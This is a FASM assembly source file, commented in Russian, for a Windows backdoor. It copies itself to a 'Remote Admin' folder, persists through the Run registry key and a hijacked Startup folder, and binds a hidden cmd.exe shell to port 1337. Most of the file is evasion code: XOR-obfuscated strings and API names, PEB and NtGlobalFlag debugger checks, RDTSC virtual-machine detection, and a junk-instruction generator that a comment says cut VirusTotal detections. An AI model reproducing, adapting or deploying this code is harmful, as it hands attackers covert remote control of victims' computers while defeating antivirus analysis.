format PE GUI
entry start

include 'INCLUDE\win32ax.inc'

;----------------------------------
;Важные данные заXORены, чтобы нельзя было вытянуть строки при анализе
;В качестве ключа для XOR используется байт (можно было и строку, но для упрощения выбран байт)
;----------------------------------

section 'IWANT' data readable writeable
        ;----------------------------------
        ;Для затруднения анализа, вызов функций происходит через GetModuleHandle, LoadLibrary и GetAddrProc.
        ;Строки с нужными функциями и библиотеками так же заXORены
        ;----------------------------------
        ;Функции и библиотека для работы с реестром
        AdvapiModKey  db 0x44
        AdvapiMod     db 0x5, 0x0, 0x12, 0x5, 0x14, 0xd, 0x77, 0x76, 0x6a, 0x0, 0x8, 0x8, 0x44 ; ADVAPI32.DLL
        AdvapiModLen  = $ - AdvapiMod
        RegOpen       db 0x16, 0x21, 0x23, 0xb, 0x34, 0x21, 0x2a, 0xf, 0x21, 0x3d, 0x1, 0x3c, 0x5, 0x44  ; RegOpenKeyExA
        RegSetVal     db 0x16, 0x21, 0x23, 0x17, 0x21, 0x30, 0x12, 0x25, 0x28, 0x31, 0x21, 0x1, 0x3c, 0x5, 0x44 ; RegSetValueExA
        RegClose      db 0x16, 0x21, 0x23, 0x7, 0x28, 0x2b, 0x37, 0x21, 0xf, 0x21, 0x3d, 0x44 ; RegCloseKey

        ;Функции и библиотека для сетевого взаимодействия
        Ws2sockModKey db 0x0ca
        Ws2sockMod    db 0xbd, 0xb9, 0xf8, 0x95, 0xf9, 0xf8, 0xe4, 0xae, 0xa6, 0xa6, 0x0ca ;WS2_32.DLL
        Ws2sockModLen = $ - Ws2sockMod
        StartUp       db 0x9d, 0x99, 0x8b, 0x99, 0x0be, 0x0ab, 0x0b8, 0x0be, 0x0bf, 0x0ba, 0x0ca  ;WSAStartup
        Socket        db 0x9d, 0x99, 0x8b, 0x99, 0x0a5, 0x0a9, 0x0a1, 0x0af, 0x0be, 0x8b, 0x0ca   ;WSASocket
        Bind          db 0x0a8, 0x0a3, 0x0a4, 0x0ae, 0x0ca                                        ;bind
        Listen        db 0x0a6, 0x0a3, 0x0b9, 0x0be, 0x0af, 0x0a4, 0x0ca                          ;listen
        Accept        db 0x0ab, 0x0a9, 0x0a9, 0x0af, 0x0ba, 0x0be, 0x0ca                          ;accept
        CloseSock     db 0x0a9, 0x0a6, 0xa5, 0x0b9, 0x0af, 0x0b9, 0x0a5, 0x0a9, 0x0a1, 0x0af, 0x0be, 0x0ca ;closesocket
        CleanUp       db 0x9d, 0x99, 0x8b, 0x89, 0x0a6, 0x0af, 0x0ab, 0x0a4, 0x0bf, 0x0ba, 0x0ca           ;WSACleanup
        
        ;Функции и библиотека для работы с файлами и процессами
        KernelModKey  db 0x0F5
        kernel32      db 0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0
        LoadLib       db 0xb9, 0x9a, 0x94, 0x91, 0xb9, 0x9c, 0x97, 0x87, 0x94, 0x87, 0x8c, 0xb4, 0x0F5    ; LoadLibraryA
        CopyFile      db 0xb6, 0x9a, 0x85, 0x8c, 0xb3, 0x9c, 0x99, 0x90, 0xb4, 0x0F5                ;CopyFileA
        CreateDir     db 0xb6, 0x87, 0x90, 0x94, 0x81, 0x90, 0xb1, 0x9c, 0x87, 0x90, 0x96, 0x81, 0x9a, \
                         0x87, 0x8c, 0xb4, 0x0F5   ;CreateDirectoryA
        GetModName    db 0xb2, 0x90, 0x81, 0xb8, 0x9a, 0x91, 0x80, 0x99, 0x90, 0xb3, 0x9c, 0x99, 0x90,  \
                         0xbb, 0x94, 0x98, 0x90, 0xb4, 0x0F5 ;GetModuleFileName
        KernelModLen  = $ - LoadLib
        
        ;----------------------------------
        ;Данные для добавления в автозагрузку
        ;Из способов выбран классический -- через реестр и через замену папки автозагрузки
        ;Для этого на компьютере создаётся директория с копией программы, из которой в будущем она будет запускаться
        ;----------------------------------
        autorunKey    db 0x99
        ;----------------------------------
        ;Путь к ветке с автозагрузкой
        ;SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN
        ;----------------------------------
        Autorun       db 0xca, 0xd6, 0xdf, 0xcd, 0xce, 0xd8, 0xcb, 0xdc, 0xc5, 0xd4, 0xd0, 0xda, 0xcb, 0xd6, \
                         0xca, 0xd6, 0xdf, 0xcd, 0xc5, 0xce, 0xd0, 0xd7, 0xdd, 0xd6, 0xce, 0xca, 0xc5, 0xda, \
                         0xcc, 0xcb, 0xcb, 0xdc, 0xd7, 0xcd, 0xcf, 0xdc, 0xcb, 0xca, 0xd0, 0xd6, 0xd7, 0xc5, \
                         0xcb, 0xcc, 0xd7, 0x99
        AutorunLen    = $ - Autorun
        pathKey       db 0x75
        ;----------------------------------
        ; Расположение файла в ОС
        ; Отсюда он будет запускаться в дальнейшем
        ; Так же этот параметр будет использоваться в качестве значений в реестре для директории автозагрузки по умолчанию
        ; C:\Remote Admin\remote_admin.exe
        ;----------------------------------
        szPath        db 0x36, 0x4f, 0x29, 0x27, 0x10, 0x18, 0x1a, 0x1, 0x10, 0x55, 0x34, 0x11,  \
                         0x18, 0x1c, 0x1b,0x29, 0x7, 0x10, 0x18, 0x1a, 0x1, 0x10, 0x2a, 0x14, 0x11, 0x18, \
                         0x1c, 0x1b, 0x5b, 0x10, 0xd, 0x10, 0x75
        PathLen       = $ - szPath

        FolderKey     db  0x9F
        ;----------------------------------
        ;Путь к ветке реестра отвечающей за директорию автозагрузки
        ;Вместо дефолтного пути там будет располагаться szPath
        ;SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
        ;----------------------------------
        AutorunFolder db 0xcc, 0xd0, 0xd9, 0xcb, 0xc8, 0xde, 0xcd, 0xda, 0xc3, 0xd2, 0xf6, 0xfc, 0xed, 0xf0,  \
                         0xec, 0xf0, 0xf9, 0xeb, 0xc3, 0xc8, 0xf6, 0xf1, 0xfb, 0xf0, 0xe8, 0xec, 0xc3, 0xdc, \
                         0xea,0xed, 0xed, 0xfa, 0xf1, 0xeb, 0xc9, 0xfa, 0xed, 0xec, 0xf6, 0xf0, 0xf1, 0xc3,  \
                         0xda, 0xe7, 0xef, 0xf3, 0xf0, 0xed, 0xfa, 0xed, 0xc3, 0xcc, 0xf7, 0xfa, 0xf3, 0xf3, \
                         0xbf, 0xd9, 0xf0, 0xf3, 0xfb, 0xfa, 0xed, 0xec, 0x9f
        FolderLen     = $ - AutorunFolder
        szParam       db 'Remote Admin', 0
        szStartup     db 'Startup', 0
        
        ;Вспомогательный буфер для копирования значений, если нужно их сохранить, а потом использовать
        ;Использовался для создания пути для копирования
        buff          db 50 dup(0)
        ;Ложный дескриптор для вызова исключений в отладчике
        hFake         dd 0x0D0000D3
        
        wsadata       WSADATA
        saddr         sockaddr_in
        sizeaddr      db sizeof.sockaddr_in
        
        ;----------------------------------
        ;Спрятанная строка cmd\0
        ;Её расишфровка произойдёт по ходу работы программы с помощью арифметических преобразований с байтами
        ;----------------------------------
        command       db 0xde, 0xad, 0xbe, 0xef

        startInfo     STARTUPINFO 0
        procInfo      PROCESS_INFORMATION 0

        ;----------------------------------
        ; Данные для генератора мусорных команд
        ;----------------------------------
        random_seed   dd 0  ;Результат ГСЧ
        min_value     dd 0  ;Нижняя граница диапазона
        max_value     dd 0  ; Верхняя граница

;----------------------------------
; Отдельная секция для неициализированных данных
; В основном здесь handlы и хроанилища адресов функций для их дальнейшего вызова
;----------------------------------
section 'GET' data readable writeable
        ;Дескриптор для загружаемых модулей
        hModule       dd ?

        ;Для ADVAPI
        hRegOpen      dd ?
        hRegSetVal    dd ?
        hRegClose     dd ?

        ;для WS2_SOCK
        hNetModule    dd ?
        hNetProc      dd ?

        ;Для kernell32
        hKernel       dd ?
        _LoadLib      dd ?
        _KernelProc   dd ?

        hSock         dd ?
        hKeyAutorun   dd ?

section 'CODEBY'  readable executable writeable
;----------------------------------
; Опкоды команд для генератора мусорных команд
;----------------------------------
        regw1         db 03h, 0C0h ;add reg1, reg2
        regw2         db 2Bh, 0C0h ;sub reg1, reg2
        regw3         db 33h, 0C0h ;xor reg1, reg2
        regw4         db 8Bh, 0C0h ;mov reg1, reg2
        regw5         db 87h, 0C0h ;xchg reg1, reg2
        regw6         db 0Bh, 0C0h ;or reg1, reg2
        regw7         db 23h, 0C0h ;and reg1, reg2
        regw8         db 0F7h, 0D0h ;not reg1
        regw9         db 0D1h, 0E0h ;shl reg1, 1
        regw10        db 0D1h, 0E8h ;shr reg1, 1
        regw11        db 081h, 0E8h ;sub reg1, rnd
        regw12        db 081h, 0C0h ;add reg1, rnd
        regw13        db 081h, 0F0h ;xor reg1, rnd
        regw14        db 081h, 0C8h ;or reg1, rnd
        regw15        db 081h, 0E0h ;and reg1, rnd
        regw16        db 0F7h, 0D8h ;neg reg1
        regw17        db 0D1h, 0C0h ;rol reg1, 1
        regw18        db 0D1h, 0C8h ;ror reg1, 1
        regw19        db 08Dh, 00h  ;lea reg1, [reg2]
        regd1         db 0B8h; mov reg1, rnd

;----------------------------------
; Инициализация ГСЧ (Генератор случайных чисел)
;----------------------------------
proc InitRand
        push eax edx
        rdtsc
        xor  eax, edx
        mov  [random_seed], eax
        pop  edx eax
        ret
endp

;----------------------------------
;Получаем случайное число
;Алгоритм взят отсюда https://www.manhunter.ru/assembler/5_generator_sluchaynih_chisel_na_assemblere.html
;----------------------------------
GenNumber:
        push edx ecx
        mov  eax,[random_seed]
        xor  edx,edx
        mov  ecx,127773
        div  ecx
        mov  ecx,eax
        mov  eax,16807
        mul  edx
        mov  edx,ecx
        mov  ecx,eax
        mov  eax,2836
        mul  edx
        sub  ecx,eax
        xor  edx,edx
        mov  eax,ecx
        mov  [random_seed],ecx
        mov  ecx,100000
        div  ecx
        mov  eax,edx
        pop  ecx edx
        ret

;----------------------------------
; Получить случайное число в нужном диапазоне
; Число возвращается в eax
;----------------------------------
proc GetRandNumber min:dword, max:dword
        push edx ecx
        mov  ecx, [max]
        sub  ecx, [min]
        inc  ecx

        stdcall  GenNumber

        xor  edx, edx
        div  ecx
        mov  eax, edx
        add  eax, [min]
        pop  ecx edx
        ret
endp

;----------------------------------
; Функция получения случайного числа в диапазоне min, max
; Возврат в eax
;----------------------------------
proc random min:dword, max:dword
        ; Сохранили значения регистров
        push ebx
        push ecx

        ;Инициализация генератора
        stdcall InitRand

        mov  ebx, [min]
        mov  ecx, [max]

        mov [min_value], ebx
        mov [max_value], ecx
        ;Получили случайное число из диапазона
        stdcall GetRandNumber, [min_value], [max_value]

        pop ecx
        ;Вернули исходные значения
        pop ebx
        ret
endp

;---------------------------------------------
;Функции для генерации конкрейтной, соответствующей случайному числу, инструкции
;---------------------------------------------
proc make_addreg
        mov esi, regw1
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_subreg
        mov esi,regw2
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_xorreg
        mov esi,regw3
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_movreg
        mov esi,regw4
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_xchgreg
        mov esi,regw5
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_orreg
        mov esi,regw6
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_andreg
        mov esi,regw7
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_notreg
        mov esi,regw8
        lodsw
        add ah, cl
        stosw
        ret
endp
proc make_shlreg
        mov esi,regw9
        lodsw
        add ah, dl
        stosw
        ret
endp

proc make_shrreg
        mov esi,regw10
        lodsw
        add ah, cl
        stosw
        ret
endp

proc make_subrnd
        mov esi,regw11
        lodsw
        add ah, dl
        stosw
        mov eax, -1
        stosd
        ret
endp

proc make_addrnd
        or edx, edx
        mov al, 05h
        stosb
        mov eax, -1
        stosd
        ret
endp

proc make_xorrnd
        or edx, edx
        mov al, 35h
        stosb
        mov eax, -1
        stosd
        ret
endp

proc make_orrnd
        mov esi,regw14
        lodsw
        add ah, cl
        stosw
        mov eax, -1
        stosd
        ret
endp

proc make_andrnd
        or edx, edx
        mov al, 25h
        stosb
        mov eax, -1
        stosd
        ret
endp

proc make_negreg
        mov esi,regw16
        lodsw
        add ah, cl
        stosw
        ret
endp
proc make_rolreg
        mov esi,regw17
        lodsw
        add ah, cl
        stosw
        ret
endp

proc make_rorreg
        mov esi,regw18
        lodsw
        add ah, cl
        stosw
        ret
endp

proc make_leareg
        mov esi, regw19
        lodsw
        xor ebx, ebx
        mov ebx, ecx
        shl ebx, 3
        or ebx, edx
        add ah, bl
        stosw
        ret
endp

proc make_movrnd
        mov esi, regd1
        lodsb
        add al, cl
        stosb
        mov eax, -1
        stosd
        ret
endp


;----------------------------------
; Процедура генерирации фейковые инструкции
;----------------------------------
proc make_fake_instruction

        push esi
        push edi
        push edx
        push ebp
        push ecx

        ; Инициализация генератора
        stdcall  InitRand

        ;Получить случайное число от 0 до19
        stdcall GetRandNumber, 0, 19

        ;Выбираем инструкцию на основе полученного числа из ГСЧ
        .if eax=0
                call make_rorreg
        .elseif eax=1
                call make_rolreg
        .elseif eax=2
                call make_addreg
        .elseif eax=3
                call make_subreg 
        .elseif eax=4
                call make_xorreg 
        .elseif eax=5
                call make_movreg
        .elseif eax=6
                call make_xchgreg 
        .elseif eax=7
                call make_orreg 
        .elseif eax=8
                call make_andreg 
        .elseif eax=9
                call make_notreg 
        .elseif eax=10
                call make_shlreg 
        .elseif eax=11
                call make_shrreg 
        .elseif eax=12
                call make_addrnd 
        .elseif eax=14
                call make_xorrnd
        .elseif eax=15
                call make_orrnd 
        .elseif eax=16
                call make_andrnd
        .elseif eax=17
                call make_negreg
        .elseif eax=18
                call make_movrnd
        .elseif eax=19
                call make_leareg
        .endif

        pop ecx
        pop ebp
        pop edx
        pop edi
        pop esi
        ret
endp

;----------------------------------
; Вспомогательная процедура для расшифровки строк с ключом
; При вызове процедуры сначала инициализируются регистры esi, edx, ecx
;----------------------------------
proc unxor
    unxoring:
        mov al, [esi]
        xor al, dl
        mov [esi], al
        inc esi
    loop unxoring
    ret
endp

;----------------------------------
; Процедура добавления программы в автозагрузку
; Программа меняет папку автозагрузки по умолчанию, а так же прописывается в ветку авотзагрузки реестра
;----------------------------------
proc AddToAutorun
        ;----------------------------------
        ;Проверка на антиотладку с помощью PEB
        ;----------------------------------
        mov eax, [fs:0x18]
        mov eax, [eax+0x30]
        movzx eax, byte [eax+2]
        cmp eax, 0
        jne _exit

        ;Расшифровываем название библиотеки для работы с реестром
        lea esi, [AdvapiMod]
        lea edx, [AdvapiModKey]
        mov dl, [edx]
        mov ecx, AdvapiModLen
        call unxor

        ;Получаем handle на бибилотеку
        invoke GetModuleHandle, AdvapiMod
        mov [hModule], eax
        
        lea esi, [RegOpen]
        lea edx, [AdvapiModKey]
        mov dl, [edx]
        mov ecx, AdvapiModLen
        inc ecx
        call unxor

        ;Получаем адрес для функции RegOpenKeyExA
        invoke GetProcAddress, [hModule], RegOpen
        mov [hRegOpen], eax
        ;Расшифровываем ветку автозагрузки
        lea esi, [Autorun]
        lea edx, [autorunKey]
        mov dl, [edx]
        mov ecx, AutorunLen
        call unxor

        ;Получаем адрес для функции RegSetValueExA
        invoke GetProcAddress, [hModule], RegSetVal
        mov [hRegSetVal], eax
        ;Получаем адрес для функции RegCloseKey
        invoke GetProcAddress, [hModule], RegClose
        mov [hRegClose], eax
        
        
        ;----------------------------------
        ;Открываем ветку реестра автозагрузки и прописываем туда параметр Remote Admin
        ;со значением C:\Remote Admin\remote_admin.exe
        ;----------------------------------
        invoke hRegOpen, HKEY_CURRENT_USER, Autorun, 0, KEY_ALL_ACCESS, hKeyAutorun
        cmp eax, 0
        ;Если открыть не получилось по какой-то причине, то пробуем поменять директорию автозагрузки по умолчанию
        jnz ChangeAutorunFolder
        
        ;Открыть ветку получилось -- добавляем свои параметры
        invoke hRegSetVal, [hKeyAutorun], szParam, NULL, REG_SZ, szPath, 53
        invoke hRegClose, [hKeyAutorun]
        
        ;----------------------------------
        ; Открылась или нет ветка реестра -- папку автозагрузки попробуем прописать
        ;----------------------------------
ChangeAutorunFolder:
        ;Расшифровываем путь ветки реестра
        lea esi, [AutorunFolder]
        lea edx, [FolderKey]
        mov dl, [edx]
        mov ecx, FolderLen
        call unxor

        invoke hRegOpen, HKEY_CURRENT_USER, AutorunFolder, 0, KEY_ALL_ACCESS, hKeyAutorun
        cmp eax, 0
        ;Если не получилось открыть -- завершаем выполнение процедуры
        jnz _exit
        invoke hRegSetVal, [hKeyAutorun], szStartup, NULL, REG_SZ, szPath, 53
        invoke hRegClose, [hKeyAutorun]

_exit:
        ret
endp


;----------------------------------
; Процедура для создания сокета и последующего запуска консоли
;----------------------------------
proc StartShell
        ;Взяли адрес функции WSAStartup
        invoke GetProcAddress, [hNetModule], StartUp
        mov [hNetProc], eax
        ;--------------------------------
        ; Проверка на антиотладку. Через NtGlobalFlag
        ;--------------------------------
        mov eax, [fs:30h]
        mov eax, [eax+68h]
        and al, 70h
        cmp al, 70h
        je exit

        ;----------------------------------
        ;Выполняем инициализацию для работы с библиотекой
        ; 0202 -- Версия используемой библиотеки
        ; wsadata -- специальная структура, содержащая инфу про реализацию сокетов
        ;----------------------------------
        invoke hNetProc, 0202h, wsadata
        ;------------------------------
        ;Генерируем номер порта (1337)
        ;------------------------------
        push  1
        pop eax
        shl eax, 3
        inc eax
        inc eax
        inc eax
        push eax
        mul eax
        pop ebx
        mul ebx
        add eax, ebx
        sub eax, 5
        xchg ah, al
        
        ;Инициализируем структуру для создания сокета 0.0.0.0:1337
        mov [saddr.sin_port], ax ;1337 
        mov [saddr.sin_family], AF_INET ;Версия IP-адресов (4)
        mov [saddr.sin_addr], 0 ; 0.0.0.0 -- any

        ;Создаём сокет для подключений
        ;Использовался WSASocket поскольку дефолтный socket не мог получать ввод/вывод из cmd
        invoke GetProcAddress, [hNetModule], Socket
        mov [hNetProc], eax

        
        invoke hNetProc, AF_INET, SOCK_STREAM, 0, NULL, NULL, NULL
        mov [hSock], eax
        
        ;Привязали сокет
        invoke GetProcAddress, [hNetModule], Bind
        mov [hNetProc], eax
        invoke hNetProc, [hSock], saddr, sizeof.sockaddr_in
        
        ;Выставили сокет в режим прослушивания и ожидаем подключений
        invoke GetProcAddress, [hNetModule], Listen
        mov [hNetProc], eax
        invoke hNetProc, [hSock], 2

        ;Приняли входящее подключение и сохранили дескриптор в edi
        invoke GetProcAddress, [hNetModule], Accept
        mov [hNetProc], eax
        invoke hNetProc, [hSock], 0, 0

        
        mov edi, eax

        ;----------------------------------
        ;После подключения клиента необходимо запустить cmd
        ;Для запуска cmd понадобится создание процесса
        ;Создание происходит дефолтно -- через CreateProcess за тем исключением, что весь ввод, вывод и ошибки будут отображаться не в запущенной консоли
        ;А будут передаваться на сокет
        ;Для этого в структуре STARTUPINFO инициализируем поля hStdInput, hStdOutput и hStdError дескриптором входящего подключения
        ;----------------------------------
    
        ;Положили в поле STARTUPINFO.cb размер структуры
        mov [startInfo.cb], sizeof.STARTUPINFO
        xor eax, eax
        ;Даём указание скрыть окно консоли при запуске
        ;SW-HIDE <=> 0x0
        mov [startInfo.wShowWindow], ax
        ;----------------------------------
        ;Здесь нам нужны флаги STARTF_USESTDHANDLES и STARTF_USESHOWWINDOW
        ;STARTF_USESTDHANDLES -- отвечает за перенаправление поток ввода, вывода, ошибок   0x100
        ;STARTF_USESHOWWINDOW -- чтобы можно было скрыть окно консоли при запуске          0x1
        ;Генерируем 0x101 и перемещаем значение в dwFlags
        ;--------------------------------
        inc eax
        shl eax, 8
        inc eax
        mov [startInfo.dwFlags], eax

        xor eax, eax
        ;В edi лежит дескриптор на входящее соединение
        ;Перемещаем его в eax для выполнения копирования
        mov eax, edi
        ;Обратились к полю hStdInput структуры STARTUPINFO  по смещению
        lea edi, [startInfo + 0x38]
        stosd ; Проинициализировали hStdInput дексприптором входящего подключения
        stosd ; Аналогично hStdOutput
        stosd ; hStdError

        ;Создаём процесс с консолью
        invoke CreateProcess, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, startInfo, procInfo
        ;Ждём завершения сессии в командной строке

        invoke WaitForSingleObject, [procInfo.hProcess], INFINITE

        ;Закрываем дескрипторы
        invoke CloseHandle, [procInfo.hProcess]
        ;Приём антиотладки. В отладчике такая инструкция вызовет исключение
        invoke CloseHandle, [hFake]
        invoke CloseHandle, [procInfo.hThread]
        
        ;Закрыли сокет и прекратили использование библиотеки
        ;После этого TCP соединение закроется
        invoke GetProcAddress, [hNetModule], CloseSock
        mov [hNetProc], eax

        invoke hNetProc, [hSock]


        invoke GetProcAddress, [hNetModule], CleanUp
        mov [hNetProc], eax
        invoke hNetProc

        ;Мусорные команды, чтобы цикл шёл бесконечно
        xor ecx, ecx
        inc ecx
        mov eax, ecx
        ret
is_DB:
        ;Спецальное значение, если замечен запуск под отладчиком
        mov eax, 0xbee
        ret
endp

start:
        ;--------------------------------
        ;Анти-песочница. Выполняется несколько мусорных инструкций
        ;В цикле с большим количеством итераций
        ;--------------------------------
        ;Прячем в коде больше число для итераций
        push 400
        pop eax
        mov ebx, 200
        mul ebx
        rol eax, 5
        mov ecx, eax  ; Итераций будет 2 560 000 -- такое значение позволило срезать несколько АВ на VirusTotal
        ;Начинаем выполнение мусора
hide_from_sandbox:
        lea esi, [make_fake_instruction]
        call esi
loop hide_from_sandbox

        ;--------------------------------
        ;unxor имён для Kernel
        ;--------------------------------
        lea esi, [LoadLib]
        lea edx, [KernelModKey]
        mov dl, [edx]
        mov ecx, KernelModLen
        call unxor

        ;--------------------------------
        ;Расшифровываем имена функций для работы с реестром
        ;--------------------------------
        lea esi, [RegSetVal]
        lea edx, [AdvapiModKey]
        mov dl, [edx]
        mov ecx, AdvapiModLen
        inc ecx
        inc ecx
        call unxor

        ;Получили handle для kernel. Он понадобится для GetProcAddress
        invoke GetModuleHandle, kernel32
        mov [hKernel], eax
        
        ;unxor имени функции закрытия ключа реестра
        lea esi, [RegClose]
        lea edx, [AdvapiModKey]
        mov dl, [edx]
        mov ecx, AdvapiModLen
        dec ecx
        call unxor

        ;--------------------------------
        ;2 в одном
        ;Проверка на запуск из ВМ и антиотладка
        ;Берём значения Time Stamp Counter и сравниваем разницу. Если > 100 -- запуск в ВМ
        ;--------------------------------
        xor esi, esi
        xor eax, eax
        rdtsc
        mov esi, eax
        rdtsc
        sub eax, esi
        cmp eax, 0x64
        ja exit
        ;--------------------------------
        ;Расшифровываем строку с путём , который будет в реестре
        ;--------------------------------
        lea esi, [szPath]
        lea edx, [pathKey]
        mov dl, [edx]
        mov ecx, PathLen
        call unxor
        
        ;Начинаем копирование исполняемого файла в заданную директорию
        ;Скопировали в буфер путь C:\Remote Admin
        lea esi, [szPath]
        lea edi, [buff]
        mov ecx, PathLen
        sub ecx, 17
copypath:
        mov al, [esi]
        mov [edi], al
        inc esi
        inc edi
loop copypath
        ;Используя buff создали директорию Remote Admin
        invoke GetProcAddress, [hKernel], CreateDir
        mov [_KernelProc], eax
        invoke _KernelProc, buff, 0
        
        ;Через вызов берём имя файа с его расположением
        invoke GetProcAddress, [hKernel], GetModName
        mov [_KernelProc], eax
        invoke _KernelProc, 0, buff, 50

        ;Произовдим копирование
        ;buff -- текущее расположение файла
        ;szPath -- пункт назначения C:\Remote Admin
        invoke GetProcAddress, [hKernel], CopyFile
        mov [_KernelProc], eax
        invoke _KernelProc, buff, szPath, 0
        
        ;--------------------------------
        ;После копирования вызываем процедуру для добавления программы в автозапуск
        ;--------------------------------
        call AddToAutorun

        ;--------------------------------
        ;Арифметические преобразования для "расшифровывания" cmd\x0
        ;--------------------------------
        xor eax, eax
        xor esi, esi
        lea esi, [command]
        mov al, [esi]
        mov dl, 3
        div dl
        add eax, 0x19
        mov [esi], al
        inc esi
        xor eax, eax
        mov al, [esi]
        shr eax, 1
        rol al, 4
        add eax, 8
        mov [esi], al
        inc esi
        xor eax, eax
        mov al, [esi]
        shr eax, 1
        inc eax
        inc eax
        inc eax
        inc eax
        inc eax
        mov [esi], al
        inc esi
        xor eax, eax
        mov [esi], eax

        xor ecx, ecx
        ;----------------------------------
        ;Для повторных соединений
        ;Загоняем StartShell в бесконечный цикл
        ;Теперь, когда сессия в командной стркое будет завершена
        ;Программа корректно завершит сессию и создаст сокет для новой, в ожидании соединения
        ;----------------------------------
        ;Расшифровываем WS2_32.DLL
        lea esi, [Ws2sockMod]
        lea edx, [Ws2sockModKey]
        mov dl, [edx]
        mov ecx, Ws2sockModLen
        call unxor
        ;Загружаем функцию LoadLibraryA для последующего использования для загрузки WS2_32.DLL
        invoke GetProcAddress, [hKernel], LoadLib
        mov [_LoadLib], eax
        invoke _LoadLib, Ws2sockMod
        mov [hNetModule], eax

        ;--------------------------------
        ;Запускаем цикл по расшифровке всех процедур  для WS2_32.DLL
        ;--------------------------------
        lea esi, [StartUp]
        lea edx, [Ws2sockModKey]
        mov dl, [edx]
        push 1
        pop  ecx
        rol ecx, 6
        call unxor

shell:
        call StartShell
        mov ecx, eax
        cmp ecx, 0xbee
        jz exit
        jmp shell
        ;--------------------------------
        ;Ветка на случай запуска под отладчиком
        ;Выполняем мусорные инструкции, а также кладём на стек и выгружаем в регистры строку "hehe fake"
        ;--------------------------------
exit:

        xor ecx, ecx
        push 200
        pop ecx
        rol ecx, 4
        xor eax, eax
        mov ax, 0x65
        push eax
        push 0x6b616620
        push 0x68656865
        pop eax ebx ecx
        call make_fake_instruction
        ;Завершаем выполнение
        invoke ExitProcess, 0

section "CERT" import data readable writeable
    library kernel, 'KERNEL32.DLL'

    import kernel, \
                   GetProcAddress, 'GetProcAddress', \
                   GetModuleHandle, 'GetModuleHandleA', \
                   CreateProcess, 'CreateProcessA', \
                   ExitProcess, 'ExitProcess', \
                   WaitForSingleObject, 'WaitForSingleObject',\
                   CloseHandle, 'CloseHandle'


    IPPROTO_TCP = 6
    INFINITE = -1